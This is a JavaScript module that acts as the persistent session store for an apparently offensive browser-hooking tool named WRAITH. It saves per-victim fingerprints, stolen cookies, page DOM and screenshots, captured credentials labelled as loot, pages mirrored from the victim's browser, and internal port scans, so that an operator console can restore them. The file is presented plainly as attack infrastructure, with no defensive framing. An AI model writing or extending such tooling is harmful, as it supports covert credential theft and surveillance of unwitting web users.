// WRAITH session store ----------------------------------------------------
// Durable, server-side memory of every hooked session, so the operator console
// fully restores on refresh/reconnect and nothing is lost across restarts.
//
// It aggregates the same per-victim state the console renders -- fingerprint,
// Page Capture (origin/cookies/DOM/screenshot), captured credentials, and scan
// results -- plus the global activity feed, and persists it to
// data/sessions.json (debounced, atomic write). On boot it reloads the file so
// prior sessions come back as offline history.
//
// Live keystroke buffers are intentionally NOT persisted: they are transient,
// and the meaningful artifact (the submitted credentials) is stored as loot.

const fs = require('fs');
const path = require('path');

const DATA_DIR = process.env.WRAITH_DATA_DIR || path.join(__dirname, 'data');
const FILE = path.join(DATA_DIR, 'sessions.json');
const MAX_EVENTS = 1000;
const MAX_PAGES = 60;                  // mirrored pages kept per session
const MAX_PAGE_HTML = 2 * 1024 * 1024; // per-page HTML cap

const sessions = new Map();   // id -> session
let feed = [];                // [{ level, text, victimId, at }]
let saveTimer = null, dirty = false;

const now = () => Date.now();

function blankScan() {
  return { localIp: null, info: [], hosts: [], ports: [], running: false, warn: '',
           total: 0, done: 0, last: null, mode: '', target: '', startedAt: 0, endedAt: 0, summary: null };
}
function blankCapture() {
  return { meta: null, cookies: [], dom: null, screenshot: null, shotDims: '', info: [], running: true, at: now() };
}

function load() {
  try {
    const data = JSON.parse(fs.readFileSync(FILE, 'utf8'));
    (data.sessions || []).forEach(s => { s.online = false; sessions.set(s.id, s); });
    feed = Array.isArray(data.feed) ? data.feed : [];
  } catch (e) { /* first run / no file yet */ }
}

function scheduleSave() {
  dirty = true;
  if (saveTimer) return;
  saveTimer = setTimeout(flush, 800);
  if (saveTimer.unref) saveTimer.unref();
}
function flush() {
  saveTimer = null;
  if (!dirty) return;
  dirty = false;
  try {
    fs.mkdirSync(DATA_DIR, { recursive: true });
    const tmp = FILE + '.tmp';
    fs.writeFileSync(tmp, JSON.stringify({ sessions: [...sessions.values()], feed }));
    fs.renameSync(tmp, FILE);           // atomic swap so a crash mid-write can't corrupt it
  } catch (e) { /* best effort */ }
}

function get(id) { return sessions.get(id); }

function upsert(id, fp, at) {
  let s = sessions.get(id);
  if (!s) {
    s = { id, fp, hookedAt: at, lastSeen: at, online: true, activeModule: null,
          capture: null, loot: [], scan: null, pages: [] };
    sessions.set(id, s);
  } else {
    s.fp = fp; s.lastSeen = at; s.online = true;
  }
  scheduleSave();
  return s;
}
function touch(id, at) { const s = sessions.get(id); if (s) { s.lastSeen = at; scheduleSave(); } }
function setOnline(id, online, at) {
  const s = sessions.get(id); if (!s) return;
  s.online = online; if (at) s.lastSeen = at; scheduleSave();
}
function setActiveModule(id, mod) { const s = sessions.get(id); if (s) { s.activeModule = mod; scheduleSave(); } }
// Hide a card from the console without deleting its stored data: the session
// stays on disk (loot preserved) but is filtered out of the roster/snapshot.
function setHidden(id, val) { const s = sessions.get(id); if (s) { s.hidden = !!val; scheduleSave(); } }
function remove(id) { return sessions.delete(id) ? (scheduleSave(), true) : false; }

// ---- page capture (mirrors the console's onCaptureResult aggregation) ----
function captureResult(id, r) {
  const s = sessions.get(id); if (!s || !r) return;
  const c = s.capture = s.capture || blankCapture();
  c.running = true;
  if (r.kind === 'meta') c.meta = r;
  else if (r.kind === 'cookies') c.cookies = r.cookies || [];
  else if (r.kind === 'dom') c.dom = { length: r.length, truncated: r.truncated, html: r.html };
  else if (r.kind === 'screenshot') { c.screenshot = r.dataUrl; c.shotDims = (r.w && r.h) ? (r.w + '×' + r.h) : ''; }
  else if (r.kind === 'info') c.info.push(r.text);
  scheduleSave();
}
function captureDone(id) { const s = sessions.get(id); if (s && s.capture) { s.capture.running = false; scheduleSave(); } }

// ---- port scan (mirrors the console's onTaskResult aggregation) ----------
function scanResult(id, r) {
  const s = sessions.get(id); if (!s || !r) return;
  const sc = s.scan = s.scan || blankScan();
  sc.running = true;
  if (r.kind === 'start') {
    sc.total = r.total || 0; sc.done = 0; sc.mode = r.mode || ''; sc.target = r.target || '';
    sc.startedAt = now(); sc.endedAt = 0; sc.hosts = []; sc.ports = []; sc.info = []; sc.warn = ''; sc.localIp = null;
  }
  else if (r.kind === 'progress') { sc.done = r.done || sc.done; sc.last = r.last; }
  else if (r.kind === 'warn') sc.warn = r.text;
  else if (r.kind === 'local-ip') sc.localIp = r.ip;
  else if (r.kind === 'info') sc.info.push(r.text);
  else if (r.kind === 'host') sc.hosts.push(r);
  else if (r.kind === 'port') sc.ports.push(r);
  scheduleSave();
}
function scanDone(id, summary) {
  const s = sessions.get(id); if (!s || !s.scan) return;
  s.scan.running = false; s.scan.endedAt = now();
  if (s.scan.total) s.scan.done = s.scan.total;
  s.scan.summary = summary || null;
  scheduleSave();
}

function addLoot(id, module, data, at) {
  const s = sessions.get(id); if (!s) return;
  s.loot.push({ module, data, at });
  scheduleSave();
}

// A page the victim mirrored back (initial DOM or a link the operator followed).
// Stored the instant it arrives so a closed victim tab can't lose it.
function addPage(id, page) {
  const s = sessions.get(id); if (!s) return;
  if (!s.pages) s.pages = [];
  if (page.html && page.html.length > MAX_PAGE_HTML) {
    page.html = page.html.slice(0, MAX_PAGE_HTML); page.truncated = true;
  }
  s.pages.push(page);
  if (s.pages.length > MAX_PAGES) s.pages = s.pages.slice(s.pages.length - MAX_PAGES);
  scheduleSave();
}

function addEvent(level, text, victimId, at) {
  feed.push({ level: level || 'cmd', text: text || '', victimId: victimId || null, at: at || now() });
  if (feed.length > MAX_EVENTS) feed = feed.slice(feed.length - MAX_EVENTS);
  scheduleSave();
}

function summary(s) {
  return { id: s.id, fp: s.fp, online: s.online, hookedAt: s.hookedAt,
           lastSeen: s.lastSeen, activeModule: s.activeModule || null };
}
function roster() { return [...sessions.values()].filter(s => !s.hidden).map(summary); }

// One message that lets a freshly-connected console rebuild the entire view.
function snapshot() {
  const capture = {}, scan = {}, pages = {}, loot = [];
  for (const s of sessions.values()) {
    if (s.hidden) continue;
    if (s.capture) capture[s.id] = s.capture;
    if (s.scan) scan[s.id] = s.scan;
    if (s.pages && s.pages.length) pages[s.id] = s.pages;
    (s.loot || []).forEach(l => loot.push({ victimId: s.id, module: l.module, data: l.data, at: l.at }));
  }
  loot.sort((a, b) => b.at - a.at);
  return { type: 'snapshot', victims: roster(), capture, scan, pages, loot, feed: feed.slice() };
}

module.exports = {
  load, flush, get, upsert, touch, setOnline, setActiveModule, setHidden, remove,
  captureResult, captureDone, scanResult, scanDone, addLoot, addPage, addEvent,
  roster, snapshot
};
